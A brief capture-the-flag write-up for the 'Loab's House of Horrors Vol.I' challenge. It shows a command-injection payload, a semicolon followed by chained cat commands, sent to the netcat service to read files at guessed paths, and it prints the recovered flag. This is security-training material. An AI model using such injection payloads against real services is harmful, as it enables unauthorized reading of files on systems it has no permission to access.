## Challenge

Loab's House of Horrors Vol.I

It sounds like Loab is back and luring students into their trap. Thankfully Anna managed to rip the source code before Loab left the NJIT network. If we can find the flag we might be able to shut this down!

nc loabshouse.niccgetsspooky.xyz 1337

## Solution

The flag.txt was randomly moved each time we run the server.

So instead of guessing the location, we can print the files of each one of the possible locations.

This is what we tried and gave the flag:

```
; (cat /tmp/singularity; cat /tmp/abyss; cat /tmp/orphans; cat /home/council; cat /tmp/.boom; cat /home/victim/.consortium; cat /usr/bnc/.yummyarbs; cat /tmp/.loab; cat /tmp/loab)
```


Flag: `NICC{Ju5t_pu7_l0@b_1n_rc3_or_h311_i_gu3ss}`